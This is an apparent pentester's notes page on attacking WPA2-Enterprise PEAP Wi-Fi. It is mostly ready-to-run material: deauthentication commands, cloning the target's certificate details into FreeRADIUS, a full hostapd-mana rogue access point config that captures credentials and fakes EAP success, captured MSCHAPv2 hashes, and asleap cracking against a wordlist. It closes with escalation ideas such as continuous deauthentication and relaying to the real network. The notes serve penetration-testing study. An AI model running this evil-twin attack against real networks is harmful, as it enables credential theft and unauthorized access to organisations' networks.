# Enterprise

* Uses Extensible Authentication Protocol (EPA) framework to allow for different types of authentication
* Authentication is done using a Remote Authentication Dial-In User Service (RADIUS) server
* Client authenticates using EAP frames depending on the agreed upon authentication scheme
* They are relayed by the AP to the RADIUS server
* If authentication is successfull, then the result is used as a Pairwise Master Key (PMK) for the four-way hanshake instead of the Pre Shared Key (PSK).

We will create a rogue AP that matches the target closely

## PEAP Exchange


## Installation

```bash
# Hostapd-mana
sudo apt-get install hostapd-mana -y
```
[Rogue AP with Mana Instructions](../rogue-ap.md)

```bash
# Install and configure freeradius (optional)
sudo apt-get install freeradius -y
```


## Commands

* Run [setup](../../setup.md) first
* Two terminals are needed
* At least on client associated with the AP

```bash
# [Terminal One]
# Collect data about the victim AP - specifically CA stuff
# The goal is to create a rogue AP
sudo airodump-ng $INTERFACE

# Look for MGT as AUTH - this is enterprise

# Stop it
qq

# Now target is found, do normal capture of it

# Set interface to monitor mode
sudo airmon-ng start $INTERFACE

# Start monitoring to collect data
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE

# [Terminal Two]
# Run the deauthentication attack to get four-way handshake
sudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE

# Wait for the four-way handshake to appear in airodump-ng window.

# Stop it
qq

# Turn off monitor mode
sudo airmon-ng stop $INTERFACE

# Open Wirshark
sudo wireshark $PCAP

# Filter for certificate
tls.handshake.certificate
# OR
tls.handshake.type == 11,3

# Drill down to get the certs
# Extensible Authentication Protocol -> Transport Layer Security -> TLSv1 Record layer: Handshake Protocol Certificate ...
#Expand Handshake Protocol: Certificate
#Certificates
#... one or more certificates will appear as Certificate: <details>
# For each certificate, right click and select Export Packet Bytes
# Save each one with the .der extension
# Display info
# openssl x509 -inform der -in DER_CERTIFICATE_FILENAME -text
# Convert to PEM format
# openssl x509 -inform der -in DER_CERTIFICATE_FILENAME -outform pem -out PEM_OUTPUT.crt

# [Terminal Two]
# Setup FreeRADIUS
sudo apt-get install freeradius -y

# Grab info about certs
openssl x509 -inform der -in DER_CERTIFICATE_FILENAME -text

# Alter FreeRADIUS in the CA block
sudo vi /etc/freeradius/3.0/certs/ca.cnf

[certificate_authority]
countryName             = US
stateOrProvinceName     = OR
localityName            = Portland
organizationName        = Ashat
emailAddress            = ca@ashat.com
commonName              = "Ashat Certificate Authority"

# Alter FreeRADIUS server block w/same info
[certificate_authority]
countryName             = US
stateOrProvinceName     = OR
localityName            = Portland
organizationName        = Ashat
emailAddress            = ca@ashat.com
commonName              = "Ashat Certificate Authority"

cd /etc/freeradius/3.0/certs/
rm dh && make

# Ignore the error
```
## HOST-MANA SECTION

```
# Create the mana file - from Andrew Long

# SSID of the AP
ssid=NetworkName

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)

channel=1 #update this

# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1

-------------------

# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1

# MOVE THE FILE TO /etc/hostapd-mana/mana.conf
#-----------------------------
# mana.eap_user

*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]


-------------------

*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]


# MOVE THE FILE TO /etc/hostapd-mana/mana.eap_user

# Start hostapd-mana
sudo hostapd-mana /etc/hostapd-mana/mana.conf


# Hostapd-mana will output asleap commands, find a user with a successful login (from wireshark traffic) and # run command like so:

asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W $WORDLIST

```

```
vi wpa_supplicant.conf

network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}

wpa_supplicant -c wpa_supplicant.conf
```


```
When a victim attempts to authenticate to our AP, the login attempt is captured.

...
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: authenticated
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: associated (aid 1)
wlan0: CTRL-EVENT-EAP-STARTED 00:2b:bb:b0:42:9e
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: cosmo
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: cosmo
MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c

method=2511 tells us that the chosen authentication is PEAP, and the line below that one includes the username cosmo. These credentials are also in /tmp/hostapd.credout.

When starting hostapd, we will append -B to run it in the background. The first few lines of hostapd will be displayed before it goes into the background, where it will continue to run until it successfully at creates the AP.

We will be using asleap to crack the password hash. We can copy/paste the output, starting with asleap, and append the wordlist /usr/share/john/password.lst to the -W parameter

kali@kali:~$ asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
Using wordlist mode with "/usr/share/john/password.lst".
        hash bytes:        586c
        NT hash:           8846f7eaee8fb117ad06bdd830b7586c
        password:          password
...
We recovered the password, password. Even if these credentials are not immediately useful to us, we'll make a note of them as they may be of use later in the pentest.

In a live scenario, it is likely the device will keep connecting and hostapd will keep showing challenge/responses.

There are a number of attack escalation opportunities at this point.

A tool called crackapd12 can automatically run asleap when it sees credentials in the log file. If crackapd successfully recovers credentials, crackapd adds the user to hostapd eap_user file. This allows the user to successfully connect to our rogue AP.

We could also provide Internet access by adding a DHCP server and a few nftables rules to enable routing, though we won't describe that approach in detail here.

We could push the attack further and authenticate ourselves to the real AP. This, along with some different nftables rules, would provide the user access to the actual company network.

If clients don't connect to our rogue AP, we can use another wireless card and look for the clients connected to the legitimate APs with airodump-ng. We would then use aireplay-ng and keep deauthenticating them. They may eventually connect to our AP, except in cases when the configuration has been locked down or if the network uses 802.11w.
```

## References

* [Andrew Long](https://systemweakness.com/defeating-wpa2-enterprise-peap-authentication-418829b8922c)
* [Challenge Handshake Authentication Protocol (CHAP)](https://en.wikipedia.org/wiki/Challenge-Handshake_Authentication_Protocol)
* [Extensible Authentication Protocol (EAP)](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)
* [EAP PEAP Authentication Protocol](https://wiki.freeradius.org/protocol/EAP-PEAP)
[EAP-TLS Authentication Protocol](https://datatracker.ietf.org/doc/html/rfc5216)
* [MS-CHAP](* [Extensible Authentication Protocol (EAP)](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol))
* [Password Authentication Protocol (PAP)](https://en.wikipedia.org/wiki/Password_Authentication_Protocol)
* [RADIUS](https://en.wikipedia.org/wiki/RADIUS)
